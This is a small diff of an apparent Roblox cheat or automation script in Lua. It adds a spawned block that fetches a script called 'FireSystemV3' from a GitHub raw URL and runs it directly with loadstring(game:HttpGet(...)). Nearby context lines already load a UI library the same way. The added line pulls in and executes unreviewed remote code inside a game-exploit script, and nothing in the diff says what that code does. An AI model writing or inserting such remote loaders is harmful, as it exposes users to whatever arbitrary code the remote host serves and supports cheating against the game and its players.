@@ -620,6 +620,10 @@ local ailmentMonitor = player.PlayerGui.AilmentsMonitorApp.Ailments
 
 --------------------- ===========================
 spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/SchoolScripts/main/FireSystemV3"))()
+end)
+
+spawn(function()
     pcall(function()
         local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Roleck11/TaskScripts/main/LibSource"))()
 
